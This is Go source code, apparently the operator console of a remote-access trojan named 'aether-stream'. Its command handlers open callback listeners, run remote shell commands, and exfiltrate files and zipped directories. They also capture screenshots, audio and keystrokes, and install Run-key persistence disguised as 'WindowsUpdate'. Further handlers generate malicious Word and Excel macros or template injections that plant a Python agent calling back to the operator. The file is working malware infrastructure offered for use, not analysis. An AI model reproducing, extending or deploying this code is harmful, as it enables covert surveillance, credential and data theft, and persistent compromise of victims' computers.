package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func handleStartCommand(parts []string) {
	if len(parts) < 3 {
		fmt.Printf("%s[!] Usage: start <name> <ip> [port] [--persistent]%s\n", ColorYellow, ColorReset)
		return
	}

	name := parts[1]
	ip := parts[2]
	persistent := false
	var port string

	for _, p := range parts[3:] {
		switch {
		case p == "--persistent":
			persistent = true
		case isPortArg(p):
			port = p
		}
	}

	if port == "" {
		var err error
		port, err = nextFreePort(4444)
		if err != nil {
			fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
			return
		}
		fmt.Printf("%s[*] Auto-assigned port %s%s\n", ColorBlue, port, ColorReset)
	}

	if err := createSessionWithPersistence(name, ip, port, persistent, ""); err != nil {
		fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	fmt.Printf("%s[+] Session '%s' created (%s:%s)%s\n", ColorGreen, name, ip, port, ColorReset)
	if persistent {
		fmt.Printf("%s[*] Persistent mode enabled%s\n", ColorBlue, ColorReset)
	}
	fmt.Printf("%s[*] Use 'listen %s' to start listening%s\n", ColorBlue, name, ColorReset)
}

func handleListenCommand(parts []string) {
	var targetSession *Session

	if len(parts) >= 2 {
		name := parts[1]
		targetSession = getSessionByName(name)
		if targetSession == nil {
			fmt.Printf("%s[!] Session '%s' not found%s\n", ColorRed, name, ColorReset)
			return
		}
	} else if currentSession != nil {
		targetSession = currentSession
	} else {
		fmt.Printf("%s[!] No active session. Usage: listen <session_name>%s\n", ColorYellow, ColorReset)
		return
	}

	if targetSession.Connected && activeConn != nil {
		fmt.Printf("%s[!] Session already connected%s\n", ColorYellow, ColorReset)
		return
	}

	for _, s := range sessionStore.Sessions {
		if s.ID != targetSession.ID && !s.Destroyed && s.Port == targetSession.Port {
			fmt.Printf("%s[!] Warning: session '%s' also uses port %s — its agent may reconnect here and be silently dropped.%s\n",
				ColorYellow, s.Name, s.Port, ColorReset)
			fmt.Printf("%s[!] Consider using a different port per session to avoid confusion.%s\n", ColorYellow, ColorReset)
		}
	}

	currentSession = targetSession
	sessionStore.ActiveSessionID = targetSession.ID
	targetSession.LastUsed = time.Now()
	targetSession.ManualDisconnect = false
	saveSessionStore()

	fmt.Printf("%s[*] Starting listener for '%s' (%s:%s)...%s\n", ColorBlue, targetSession.Name, targetSession.IP, targetSession.Port, ColorReset)
	go startListener(targetSession)
}

func handleUseCommand(parts []string) {
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: use <session_name>%s\n", ColorYellow, ColorReset)
		return
	}

	name := parts[1]
	sess := getSessionByName(name)
	if sess == nil {
		fmt.Printf("%s[!] Session '%s' not found%s\n", ColorRed, name, ColorReset)
		return
	}

	currentSession = sess
	sessionStore.ActiveSessionID = sess.ID
	saveSessionStore()
	fmt.Printf("%s[*] Switched to session '%s'%s\n", ColorGreen, name, ColorReset)
}

func handleDeleteCommand(parts []string) {
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: delete <session_name>%s\n", ColorYellow, ColorReset)
		return
	}

	if err := deleteSession(parts[1]); err != nil {
		fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	fmt.Printf("%s[*] Session '%s' deleted%s\n", ColorGreen, parts[1], ColorReset)
}

func handleRenameCommand(parts []string) {
	if len(parts) < 3 {
		fmt.Printf("%s[!] Usage: rename <old_name> <new_name>%s\n", ColorYellow, ColorReset)
		return
	}

	if err := renameSession(parts[1], parts[2]); err != nil {
		fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	fmt.Printf("%s[*] Renamed '%s' to '%s'%s\n", ColorGreen, parts[1], parts[2], ColorReset)
}

func handleDescribeCommand(parts []string) {
	if len(parts) < 3 {
		fmt.Printf("%s[!] Usage: describe <session_name> <description>%s\n", ColorYellow, ColorReset)
		return
	}

	sess := getSessionByName(parts[1])
	if sess == nil {
		fmt.Printf("%s[!] Session '%s' not found%s\n", ColorRed, parts[1], ColorReset)
		return
	}

	sess.Description = strings.Join(parts[2:], " ")
	saveSessionStore()
	fmt.Printf("%s[*] Description updated for '%s'%s\n", ColorGreen, parts[1], ColorReset)
}

func handleStopCommand() {
	if activeConn == nil {
		fmt.Printf("%s[!] No active connection%s\n", ColorYellow, ColorReset)
		return
	}

	if currentSession != nil {
		currentSession.ManualDisconnect = true
		currentSession.Connected = false
		saveSessionStore()
	}

	activeConn.Close()
	activeConn = nil
	if activeListener != nil {
		activeListener.Close()
		activeListener = nil
	}
	fmt.Printf("%s[*] Disconnected from session%s\n", ColorBlue, ColorReset)
	if rl != nil {
		rl.SetPrompt(getPrompt())
	}
	refreshPrompt()
}

func handleSetDownloadPath(parts []string) {
	if currentSession == nil {
		fmt.Printf("%s[!] No active session%s\n", ColorYellow, ColorReset)
		return
	}

	if len(parts) < 2 {
		currentSession.DownloadPath = ""
		saveSessionStore()
		fmt.Printf("%s[*] Download path reset to default (downloads/%s/)%s\n", ColorBlue, currentSession.Name, ColorReset)
		return
	}

	path := parts[1]
	if err := os.MkdirAll(path, 0755); err != nil {
		fmt.Printf("%s[!] Error creating directory: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	currentSession.DownloadPath = path
	saveSessionStore()
	fmt.Printf("%s[*] Download path set to: %s%s\n", ColorGreen, path, ColorReset)
}

func handleExecCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: exec <command>%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgExecCmd, []byte(strings.Join(parts[1:], " ")))
}

func handleWhoamiCommand() {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgExecCmd, []byte("whoami"))
}

func handleSysinfoCommand() {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgExecCmd, []byte("sysinfo"))
}

func handleDownloadCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: download <remote_path>%s\n", ColorYellow, ColorReset)
		return
	}

	remotePath := strings.Join(parts[1:], " ")
	downloadPath := getSessionDownloadPath(currentSession)
	os.MkdirAll(downloadPath, 0755)
	pendingFile = filepath.Join(downloadPath, filepath.Base(remotePath))
	downloadStats[pendingFile] = &TransferStats{StartTime: time.Now()}
	sendCommand(MsgFileDownloadReq, []byte(remotePath))
}

func handleDownloadAllCommand(parts []string, recursive bool) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}

	path := "."
	if len(parts) >= 2 {
		path = strings.Join(parts[1:], " ")
	}

	pendingLocalBase = getSessionDownloadPath(currentSession)
	os.MkdirAll(pendingLocalBase, 0755)
	pendingRemoteDir = path

	if recursive {
		pendingDownloadMode = "downloadrecursive"
		pendingDirStack = nil
		pendingRemoteFiles = nil
		fmt.Printf("%s[*] Recursively listing '%s'...%s\n", ColorBlue, path, ColorReset)
	} else {
		pendingDownloadMode = "downloadall"
		fmt.Printf("%s[*] Listing '%s' for download...%s\n", ColorBlue, path, ColorReset)
	}
	sendCommand(MsgFileList, []byte(path))
}

func handleUploadCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 3 {
		fmt.Printf("%s[!] Usage: upload <local_path> <remote_path>%s\n", ColorYellow, ColorReset)
		return
	}

	localPath := parts[1]
	remotePath := parts[2]

	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("%s[!] Error reading file: %v%s\n", ColorRed, err, ColorReset)
		return
	}

	fmt.Printf("%s[~] Uploading %s (%s) to %s...%s\n", ColorYellow, localPath, formatBytes(int64(len(data))), remotePath, ColorReset)
	payload := append([]byte(remotePath+"\x00"), data...)
	sendCommand(MsgFileUploadReq, payload)
}

func handleLsCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	path := "."
	if len(parts) >= 2 {
		path = strings.Join(parts[1:], " ")
	}
	sendCommand(MsgFileList, []byte(path))
}

func handleCdCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: cd <path>%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgChangeDir, []byte(strings.Join(parts[1:], " ")))
}

func handlePwdCommand() {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgGetCwd, []byte{})
}

func handleRmCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: rm <path>%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgFileDelete, []byte(strings.Join(parts[1:], " ")))
}

func handleGenerateCommand(parts []string) {
	if len(parts) < 3 {
		fmt.Printf("%s[!] Usage: generate <macro|template> <word|excel> [input/url]%s\n", ColorYellow, ColorReset)
		return
	}

	method := strings.ToLower(parts[1])
	officeType := strings.ToLower(parts[2])

	if currentSession == nil {
		fmt.Printf("%s[!] No active session. Use 'use <session>' first%s\n", ColorYellow, ColorReset)
		return
	}

	switch method {
	case "macro":
		if len(parts) >= 4 {
			if err := injectMacroIntoOffice(parts[3], officeType, currentSession); err != nil {
				fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
			}
		} else {
			pythonCode := generatePythonAgent(currentSession.IP, currentSession.Port, currentSession.Token, currentSession.Persistent)
			var macro string
			if officeType == "excel" {
				macro = generateExcelMacro(pythonCode)
			} else {
				macro = generateVBAMacro(pythonCode)
			}
			fmt.Printf("%s\n--- VBA Macro (copy into VBA editor) ---\n%s\n%s%s\n", ColorBlue, ColorReset, macro, ColorReset)
		}
	case "template":
		var templateURL string
		if len(parts) >= 4 {
			templateURL = parts[3]
		}
		if err := createTemplateInjection(currentSession, officeType, templateURL); err != nil {
			fmt.Printf("%s[!] Error: %v%s\n", ColorRed, err, ColorReset)
		}
	default:
		fmt.Printf("%s[!] Unknown method: %s%s\n", ColorRed, method, ColorReset)
	}
}

func handlePersistCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: persist <install|remove|status>%s\n", ColorYellow, ColorReset)
		return
	}

	switch strings.ToLower(parts[1]) {
	case "install":
		sendCommand(MsgInstallPersistence, []byte{})
	case "remove":
		sendCommand(MsgRemovePersistence, []byte{})
	case "status":
		sendCommand(MsgExecCmd, []byte(`python -c "import winreg as r; k=r.OpenKey(r.HKEY_CURRENT_USER,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,r.KEY_READ); print('Installed:',r.QueryValueEx(k,'WindowsUpdate')[0])"`))
	default:
		fmt.Printf("%s[!] Unknown action: %s%s\n", ColorRed, parts[1], ColorReset)
	}
}

func handleSelfDestructCommand() {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}

	fmt.Printf("%s[!] WARNING: This will delete the agent and all session data!%s\n", ColorRed, ColorReset)
	var confirmation string
	if rl != nil {
		rl.SetPrompt(fmt.Sprintf("%s[?] Type 'DESTROY' to confirm: %s", ColorRed, ColorReset))
		confirmation, _ = rl.Readline()
		rl.SetPrompt(getPrompt())
	} else {
		fmt.Printf("%s[?] Type 'DESTROY' to confirm: %s", ColorRed, ColorReset)
		fmt.Scanln(&confirmation)
	}

	if strings.TrimSpace(confirmation) != "DESTROY" {
		fmt.Printf("%s[*] Cancelled%s\n", ColorBlue, ColorReset)
		return
	}

	sendCommand(MsgSelfDestruct, []byte{})
	if currentSession != nil {
		currentSession.Destroyed = true
		saveSessionStore()
	}
}

func handleScreenshotCommand() {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	fmt.Printf("%s[*] Capturing screenshot...%s\n", ColorBlue, ColorReset)
	downloadPath := getSessionDownloadPath(currentSession)
	os.MkdirAll(downloadPath, 0755)
	ts := time.Now().Format("20060102_150405")
	pendingFile = filepath.Join(downloadPath, fmt.Sprintf("screenshot_%s.png", ts))
	downloadStats[pendingFile] = &TransferStats{StartTime: time.Now()}
	sendCommand(MsgScreenshot, []byte{})
}

func handleKeylogCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: keylog <start|stop|dump>%s\n", ColorYellow, ColorReset)
		return
	}
	switch strings.ToLower(parts[1]) {
	case "start":
		sendCommand(MsgKeylogStart, []byte{})
	case "stop":
		sendCommand(MsgKeylogStop, []byte{})
	case "dump":
		sendCommand(MsgKeylogDump, []byte{})
	default:
		fmt.Printf("%s[!] Unknown keylog action: %s%s\n", ColorRed, parts[1], ColorReset)
	}
}

func handleRecordCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	secs := "5"
	if len(parts) >= 2 {
		secs = parts[1]
	}
	fmt.Printf("%s[*] Recording %s second(s) of audio...%s\n", ColorBlue, secs, ColorReset)
	downloadPath := getSessionDownloadPath(currentSession)
	os.MkdirAll(downloadPath, 0755)
	ts := time.Now().Format("20060102_150405")
	pendingFile = filepath.Join(downloadPath, fmt.Sprintf("recording_%s.wav", ts))
	downloadStats[pendingFile] = &TransferStats{StartTime: time.Now()}
	sendCommand(MsgRecord, []byte(secs))
}

func handleSayCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: say <text>%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgExecCmd, []byte("say:"+strings.Join(parts[1:], " ")))
}

func handleSearchCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: search <pattern>  (e.g. *.docx)%s\n", ColorYellow, ColorReset)
		return
	}
	fmt.Printf("%s[*] Searching for '%s'...%s\n", ColorBlue, parts[1], ColorReset)
	sendCommand(MsgSearch, []byte(parts[1]))
}

func handleZipCommand(parts []string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	if len(parts) < 2 {
		fmt.Printf("%s[!] Usage: zip <remote_path>%s\n", ColorYellow, ColorReset)
		return
	}
	path := strings.Join(parts[1:], " ")
	fmt.Printf("%s[*] Zipping '%s' and downloading...%s\n", ColorBlue, path, ColorReset)
	downloadPath := getSessionDownloadPath(currentSession)
	os.MkdirAll(downloadPath, 0755)
	ts := time.Now().Format("20060102_150405")
	base := filepath.Base(strings.TrimRight(path, "/\\"))
	pendingFile = filepath.Join(downloadPath, fmt.Sprintf("%s_%s.zip", base, ts))
	downloadStats[pendingFile] = &TransferStats{StartTime: time.Now()}
	sendCommand(MsgZip, []byte(path))
}

func handleSimpleAgentCommand(cmd string) {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	sendCommand(MsgExecCmd, []byte(cmd))
}

func handleShellMode() {
	if activeConn == nil {
		fmt.Printf("%s[!] Not connected to any session%s\n", ColorYellow, ColorReset)
		return
	}
	shellMode = true
	fmt.Printf("%s[*] Entering shell mode. Type 'exit' to return to aether-stream.%s\n", ColorBlue, ColorReset)
	if rl != nil {
		rl.SetPrompt(fmt.Sprintf("%sshell(%s)%s$ ", ColorYellow, currentSession.Name, ColorReset))
		rl.Refresh()
	}
	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}
		input := strings.TrimSpace(line)
		if input == "" {
			continue
		}
		if strings.ToLower(input) == "exit" {
			break
		}
		sendCommand(MsgExecCmd, []byte(input))
		if rl != nil {
			rl.SetPrompt("")
		}
		time.Sleep(100 * time.Millisecond)
		if rl != nil && shellMode {
			rl.SetPrompt(fmt.Sprintf("%sshell(%s)%s$ ", ColorYellow, currentSession.Name, ColorReset))
			rl.Refresh()
		}
	}
	shellMode = false
	fmt.Printf("%s[*] Exited shell mode%s\n", ColorBlue, ColorReset)
	refreshPrompt()
}
